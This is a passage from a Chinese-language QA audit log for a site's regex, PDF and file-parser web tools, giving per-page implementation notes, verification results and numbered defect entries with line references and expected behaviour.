| `tools/it/regex-common` | 查表（8 条类别常量）+ 原生 RegExp 逐类执行 | 给定类/文本可验证 | 8 类下拉已实装并可切换（IT-D27，第169批） |
| `tools/it/regex-escape` | 自写逐字符映射转义/反转义，不走 RegExp | 部分可逆 | 转义正确；反转义吞类别转义 |
| `tools/it/regex-visualizer` | 递归下降解析 AST 树 + 保留线性状态链；`new RegExp` 校验合法性 | 树结构可验证、状态链可复算 | AST 层级已实装且双路径转义（IT-D28，第171批）；铁路图样式仍未实现 |

### 独立实现 vs 共享实现

- **独立 2 页**：regex（Worker 原生引擎）、regex-visualizer（自写 tokenizer）。
- **共享模板 3 页**：regex-cheatsheet 与 regex-common 同属 `COMMANDS/escapeHtml/filter/dataGrid` 速查表脚手架（与 nginx/sql 等 20+ 速查页同源）；regex-escape 的 `esc/unesc` 骨架与 css-escape、url-parser 同源。
- 结论：5 页 3 种实现范型（原生引擎 / 查表 / 自写字符串处理），无两页共享同一正则实现。

### 逐页结论

- **regex**：默认 `\d+`/`g`/含 123、456、8888、9999 的文本 → 4 条匹配正确；`escapeHtml` 覆盖全部输出（`:547/566/578/602/642`），无 XSS；`:727` 早于 `#rx-worker-src`（`:850`）调用，首屏短暂显示「组件未加载」（IT-N252 的超时部分已修，双跑仍成立）。
- **regex-cheatsheet**：纯查表；`\A \Z` 与 `[:alpha:]` 两条 params 已标注「JS 不支持」及适用引擎（IT-D30，第170批）；检索/分类/复制逻辑不变。
- **regex-common**：类别选择器已补齐 8 个 option 并可切换（IT-D27，第169批）；默认 email，8 类均可达，结果与原高亮/偏移明细逻辑不变。
- **regex-escape**：默认 `Hello (World)? [a-z]+ $19.99` → `Hello \(World\)\? \[a-z\]\+ \$19\.99` 正确；反转义 `\d+\w`→`d+w`（IT-D29）。
- **regex-visualizer**：递归下降 AST 树已实装（分支/分组类型/量词/字符类/锚点层级，第171批），默认 `^a[0-9]+b$` 仍输出 10 token / 12 状态线性链作为附加视图；AST 与状态链双路径均经 escapeHtml（IT-N348 回归保持）。

### 问题清单（新增）

| 编号 | 页面:行 | 级别 | 问题与期望值 |
|---|---|---|---|
| IT-D29 | `tools/it/regex-escape.html:310` | 中 | `default: out += n` 丢弃反斜杠：`\d+\w`→`d+w`、`\b`→`b`、`\s`→`s`，反转义后正则语义反转。期望保留 `\d \w \b \s \p{…}` 原样 |

### 统计

- 页数 **5**；独立实现 **2** / 共享模板 **3**。
- 新增 **4** 条（高 **2** / 中 **2** / 假 **0** / 安全 **0**）；编号 IT-D27–IT-D30。
- 复核既有：IT-N253（base64 `+` 被 URLSearchParams 解成空格）、IT-N254（替换/复制恒补 `g`）仍成立；IT-N252 的超时部分已失效（`:492-521` Worker + 800ms），「每次按键跑两遍」仍成立（`#flags` 内联 oninput 与 `:465` 双绑）。
- 复算方式：`/tmp` node 同构造跑默认用例与 `\A`/`[:alpha:]` 语义，`new RegExp` 校验；未开浏览器、未跑 `_build.py`/门禁、未改仓库文件。

## AC 批 · PDF/文件解析族（2026-11-04）

### 族矩阵

| 页面 | 实现方式 | 可逆或可验证 | 结论 |
|---|---|---|---|
| `tools/office/pdf-merge` | pdf-lib@1.17.1 `copyPages` + `save` | node 实测 2+3 页合并成 5 页、尺寸正确 | 真处理；加密文件预检有缺陷 |
| `tools/office/pdf-split` | pdf.js 渲染缩略图 + pdf-lib 提取页 | 页数/旋转/顺序可验证 | 真提取；range 按填写顺序（IT-D35，第173批）、历史回填不下载（IT-D36，第174批）；只产 1 个文件仍留存 |
| `tools/office/pdf-rotate` | pdf.js 预览 + pdf-lib `setRotation`/`save` | node 回读角度 [90,270] 正确 | 真处理，未发现缺陷 |
| `tools/it/pdf-signature-checker` | 自读字节 + 正则匹配 `/ByteRange`、`/Contents` | 构造字节可验证 | 只判签名存在，无密码学验签 |
| `tools/it/properties-parser` | 自写逐行扫描 + 转义还原 | node 7 组用例 | 真解析；CRLF/`\u`/续行有错 |
| `tools/it/ini-parser` | 自写 `indexOf('=')` 逐行解析 | node 7 组用例 + JSDOM 7 组 | 真解析；无值键已修（IT-D40，第168批），`:` 分隔仍不支持 |
| `tools/it/curl-parser` | 正则分词 + 选项表 | node 9 组命令 | 真解析；续行/转义/urlencode 有缺陷 |
| `tools/it/plist-parser` | 原生 `DOMParser` 解析 XML plist | 默认 SAMPLE 可验证 | 真解析（binary plist 明确不支持） |
| `tools/it/user-agent-parser` | 正则抽取浏览器/引擎/OS/设备 | UA 用例可复现 | 微信/百度爬虫已补（IT-D41，第172批）；CriOS/FxiOS/Samsung 既有规则已在位 |

### 独立实现 vs 共享实现

- **共享 3 页**：pdf-merge、pdf-split、pdf-rotate 共用同一条 `pdf-lib@1.17.1` CDN（带 SRI）；后两页另共用 `pdf.js 3.11.174` 与同一 worker 源 → CDN/worker 失效或库升级时 3 页同时受影响。
- **独立 6 页**：两个解析族与签名检查器各自实现，互不共享解析核心，只共用 Tab/历史/图表模板 → 缺陷不同源，可分别修。
- 同源风险集中在 properties 与 ini 两个键值格式解析器：行切分/去空白/重复键策略各写各的，口径不一致（`host:localhost` 在 properties 正确、在 ini 整行丢弃）。

### 逐页结论

- **pdf-merge**：真实合并并正确转义文件名；加密 PDF 预检用 `ignoreEncryption` 判为可用，`copyPages` 不解密 → 与「跳过并继续」承诺不符（IT-D32）。
- **pdf-split**：真实提取、真实缩略图；range 模式已按填写顺序解析（IT-D35，第173批），缩略图勾选模式仍按自然升序；历史回填只恢复输入、不再触发下载（IT-D36，第174批）；只产 1 个 PDF（IT-D34）仍留存。
- **pdf-rotate**：真旋转，预览叠加差值、写入绝对角度，回读一致，本轮无缺陷。
- **pdf-signature-checker**：仅检测签名存在；文件头 `%PDF-49.46` 恒不匹配判红（既有 `it.md:2582`）、字节数算式错（既有 `:2588`）、PKCS#7 验签承诺未实现（既有 `:2593`）。
- **properties-parser**：核心扫描正确；CRLF/裸 CR 换行已修正（IT-D33，第167批）；`\uXXXX` 不解码（既有 `:140`）、行尾 `\\` 当续行（既有 `:141`）仍留存。
- **ini-parser**：节/注释/重复键正常；无值键（裸布尔标志）已保留为空串（IT-D40，第168批）；`:` 分隔仍不支持（IT-D39）。
- **curl-parser**：`-d`→POST、选项值消费、输出转义、`--data-urlencode` 百分号编码（IT-D37，第164批）、双引号内 `\"` 反转义（IT-D38，第165批）、反斜杠续行折叠（IT-D31，第166批）均已修到位；本批无其它残留项。
- **plist-parser**：XML 真解析，dict/array/integer/real/bool 正确；`data`、`date` 原样返回（既有）。
- **user-agent-parser**：Chrome/Safari/Edge/Firefox/Googlebot 正确；CriOS/FxiOS/Samsung 既有规则已在位（清单旧描述过时）；微信（MicroMessenger/）与百度爬虫（Baiduspider）已补规则（IT-D41，第172批），微信含 Chrome/ 时优先判微信。

### 问题清单（新增）

| 编号 | 页面:行 | 级别 | 问题与期望值 |
|---|---|---|---|
| IT-D32 | `tools/office/pdf-merge.html:512,703` | 高 | `loadPageCount` 用 `ignoreEncryption` 使加密文件列为可用；`copyPages` 不解密 → 整体抛错或输出空白，与 `:349,:391`「跳过并提示、不影响其余」矛盾。期望单文件标 error 后 `continue`（node 加载同版本 pdf-lib：正常 2+3 页合并成功，`copyPages` 无加密检查） |
| IT-D34 | `tools/office/pdf-split.html:568,455-466` | 假 | 宣称「拆分 PDF 为多个小文件」「段数=ceil(总页数/每段页数)」「文件数=段数」，实际无「每段页数」输入且只产出 1 个 PDF |
| IT-D39 | `tools/it/ini-parser.html:275` | 中 | 只认 `=`：`[s]` + `host: localhost` → `{}`，期望 `{"s":{"host":"localhost"}}`（页面称「= 或 : 分隔」） |

### 统计

- 页数 **9**（PDF 4 + 解析 5）；独立实现 **6** / 共享实现 **3**。
- 新增 **11** 条（高 **3** / 中 **7** / 假 **1** / 安全 **0**）；编号 IT-D31–IT-D41。
- 复核既有 6 条（`it.md:2582`、`:2588`、`:2593`、`:140`、`:141`、IT-N65）均仍成立；IT-N24（重复节丢键）原记录标注已修，待独立复核。
- 复算方式：按页面函数逐行复刻 node 桩（properties/ini/curl/UA）；PDF 用同版本 pdf-lib 真调用；未开浏览器、未跑 `_build.py`/门禁、未改仓库文件。

